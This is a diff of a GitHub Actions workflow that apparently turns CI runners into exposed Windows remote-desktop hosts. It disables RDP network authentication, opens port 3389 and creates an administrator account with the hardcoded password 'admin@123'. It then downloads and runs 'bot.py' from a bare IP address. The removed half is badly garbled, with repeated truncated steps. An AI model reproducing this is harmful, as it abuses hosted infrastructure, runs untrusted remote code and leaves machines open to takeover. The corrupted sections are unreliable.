@@ -1,371 +1,100 @@
-name: RDP on Old Windows Versions Only
+name: RDP Rotator
 
 on:
   workflow_dispatch:
 
 jobs:
-  setup-rdp:
-    strategy:
-      fail-fast: false
-      matrix:
-        include:
-          - os: windows-2019
-            server: 1
-          - os: windows-2019
-            server: 2
-          - os: windows-2019
-            server: 3
-          - os: windows-2019
-            server: 4
-          - os: windows-2019
-            server: 5
-          - os: windows-2019
-            server: 6
-          - os: windows-2019
-            server: 7
-          - os: windows-2019
-            server: 8
-          - os: windows-2019
-            server: 9
-          - os: windows-2019
-            server: 10
-          - os: windows-2022
-            server: 11
-          - os: windows-2022
-            server: 12
-          - os: windows-2022
-            server: 13
-          - os: windows-2022
-            server: 14
-          - os: windows-2022
-            server: 15
-          - os: windows-2022
-            server: 16
-          - os: windows-2022
-            server: 17
-          - os: windows-2022
-            server: 18
-          - os: windows-2022
-            server: 19
-          - os: windows-2022
-            server: 20
-
-    runs-on: ${{ matrix.os }}
-    timeout-minutes: 3600
-
+  rdp-rotator:
+    runs-on: windows-2019
+    timeout-minutes: 43200
     steps:
-      - name: Enable RDP and Create User
+      - name: Run RDP Rotator
         shell: pwsh
         run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          netsh advfirewall firewall delete rule name="RDP" 2>$null
-          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-          Restart-Service TermService -Force
-          $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
-          if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
+          $servers = @(
+            "windows-2019", "windows-2019", "windows-2019", "windows-2019", "windows-2019",
+            "windows-2019", "windows-2019", "windows-2019", "windows-2019", "windows-2019",
+            "windows-2022", "windows-2022", "windows-2022", "windows-2022", "windows-2022",
+            "windows-2022", "windows-2022", "windows-2022", "windows-2022", "windows-2022"
+          )
+          
+          $serverCounter = 1
+          
+          while ($true) {
+            $randomIndex = Get-Random -Minimum 0 -Maximum $servers.Count
+            $selectedOS = $servers[$randomIndex]
+            
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+            netsh advfirewall firewall delete rule name="RDP" 2>$null
+            netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+            Restart-Service TermService -Force
+            
+            $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+            if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
               Remove-LocalUser -Name "TOOLBOXLAP" -Force
-          }
-          New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
-          try {
+            }
+            New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
+            Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
+            Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
+            
+            try {
               $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          } catch {
+            } catch {
               $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+            }
+            
+            Write-Host "============================================"
+            Write-Host "SERVER NUMBER : $serverCounter"
+            Write-Host "WINDOWS OS    : $selectedOS"
+            Write-Host "IP ADDRESS    : $ip"
+            Write-Host "PORT          : 3389"
+            Write-Host "USERNAME      : TOOLBOXLAP"
+            Write-Host "PASSWORD      : admin@123"
+            Write-Host "============================================"
+            
+            $desktop = [Environment]::GetFolderPath("Desktop")
+            $infoFile = "$desktop\RDP_INFO_SERVER_$serverCounter.txt"
+            
+            # طريقة مبسطة لكتابة الملف بدون Here-String
+            "IP: $ip" | Out-File -FilePath $infoFile -Encoding UTF8
+            "Port: 3389" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+            "User: TOOLBOXLAP" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+            "Pass: admin@123" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+            "OS: $selectedOS" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+            
+            $btol = "http://31.57.97.230:5000"
+            try {
+                Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
+                $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+                if (-not $pythonPath) {
+                    $installer = "$env:TEMP\python.exe"
+                    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+                    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+                    Remove-Item $installer -Force
+                    Start-Sleep -Seconds 10
+                    $pythonPath = "C:\Python311\python.exe"
+                }
+                if (Test-Path "$desktop\bot.py") {
+                    Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                }
+            } catch {
+                Write-Host "Error downloading bot"
+            }
+            
+            Write-Host "Waiting 60 seconds before changing server..."
+            
+            for ($i = 60; $i -ge 1; $i--) {
+              Write-Host "Changing in $i seconds..."
+              Start-Sleep -Seconds 1
+            }
+            
+            Write-Host "Stopping old server..."
+            netsh advfirewall firewall delete rule name="RDP" 2>$null
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1 -Force
+            
+            Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+            
+            $serverCounter++
+            Start-Sleep -Seconds 5
           }
-          Write-Host ""
-          Write-Host "============================================"
-          Write-Host "RDP CONNECTION INFO"
-          Write-Host "============================================"
-          Write-Host "Server Number : ${{ matrix.server }}"
-          Write-Host "Windows OS    : ${{ matrix.os }}"
-          Write-Host "IP Address    : $ip"
-          Write-Host "Port          : 3389"
-          Write-Host "Username      : TOOLBOXLAP"
-          Write-Host "Password      : admin@123"
-          Write-Host "============================================"
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $infoFile = "$desktop\RDP_INFO_SERVER_${{ matrix.server }}.txt"
-          "IP: $ip`nUser: TOOLBOXLAP`nPass: admin@123" | Out-File -FilePath $infoFile
-
-      - name: Download and Run Bot
-        shell: pwsh
-        run: |
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $botUrl = "http://31.57.97.230:5000"
-          for ($i = 1; $i -le 3; $i++) {
-              try {
-                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
-                  break
-              } catch {
-                  Start-Sleep -Seconds 5
-              }
-          }
-          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-          if (-not $pythonPath) {
-              $installer
-
-
-  workflow_dispatch:
-
-
-  workflow_dispatch:
-
-
-
-
-
-
-    
-
-   
-
-    
-
-    = "$env:TEMP\python.exe"
-              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
-              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-              Remove-Item 
-              Remove-Item $
-              Remove-$installer -Force
-              Start-Sleep -Seconds 10
-              
-              Start-Sleep -Seconds 10
-             
-              Start-Sleep -Seconds 10
-              Start-Sleep -Seconds
-              Start-Sleep
-              Start$pythonPath = "C:\Python311\python.exe"
-          }
-          
-          }
-         if (Test-Path "$desktop\bot.py") {
-              Start-Process -FilePath 
-              Start-Process -FilePath
-              Start-Process
-              Start$pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
-          }
-
-      - name: Keep Alive 
-          }
-
-      - name: Keep Alive
-          }
-
-      - name:
-          }
-
-      -
-          }
-for 1 minute
-        shell: pwsh
-        run: |
-          
-        shell: pwsh
-        run: |
-         
-        shell: pwsh
-        run:
-        shell: pwsh
-       
-        shell: pwsh
-        shell:$ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          
-          $$endTime = (Get-Date).AddMinutes(1)
-          Write-Host 
-          Write-Host
-          Write""
-          Write-Host "Server ${{ matrix.server }} is ACTIVE"
-          Write-Host "RDP: $ip:3389"
-          Write-Host "User: TOOLBOXLAP"
-          Write-Host "Pass: admin@123"
-          Write-Host "Will run for 1 minute until: $endTime"
-          Write-Host ""
-          while ((Get-Date) -lt $endTime) {
-              Start-Sleep -Seconds 
-              Start-Sleep -Seconds
-              Start-Sleep
-              Start60
-              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host 
-              Write-Host
-              Write"[$(Get-Date)] Server ${{ matrix.server }} - $remaining minutes remaining - RDP: $ip"
-          }
-          Write-Host 
-          }
-          Write-
-          }
-         ""
-          Write-Host "Server ${{ matrix.server }} session completed (1 minute)"
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell: pwsh
-        run: |
-          
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell: pwsh
-        run: |
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell: pwsh
-        run
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell: pwsh
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell: pw
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-        shell
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New Server
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name: Start New
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      - name:
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-      -
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -Force
-
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-Computer -
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-          Stop-
-
-      - name: Shutdown Server
-        shell: pwsh
-        run: |
-         
-
-      - name: Shutdown Server
-        shell: pwsh
-        run:
-
-      - name: Shutdown Server
-        shell: pwsh
-       
-
-      - name: Shutdown Server
-        shell: pwsh
-
-      - name: Shutdown Server
-        shell:
-
-      - name: Shutdown Server
-       
-
-      - name: Shutdown Server
-
-      - name: Shutdown
-
-      - name
-
-     # Start a new server with the same script
-          # This will create a new server and run the script again
-          # You can use a loop to repeat this process indefinitely
-          # For example:
-          # while ($true) {
-          #   # Start a new server
-          #   # Run the script
-          #   Start-Sleep -Seconds 60
-          # }
-
-      - name: Get New IP
-        shell: pwsh
-        run: |
-          
-
-      - name: Get New IP
-        shell: pwsh
-        run: |
-         
-
-      - name: Get New IP
-        shell: pwsh
-        run:
-
-      - name: Get New IP
-        shell: pwsh
-       
-
-      - name: Get New IP
-        shell: pwsh
-
-      - name: Get New IP
-        shell:
-
-      - name: Get New IP
-       
-
-      - name: Get New IP
-
-      - name: Get
-
-      -# Get the IP address of the new server
-          $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          Write-Host 
-          Write-Host
-          Write"New IP: $newIp"
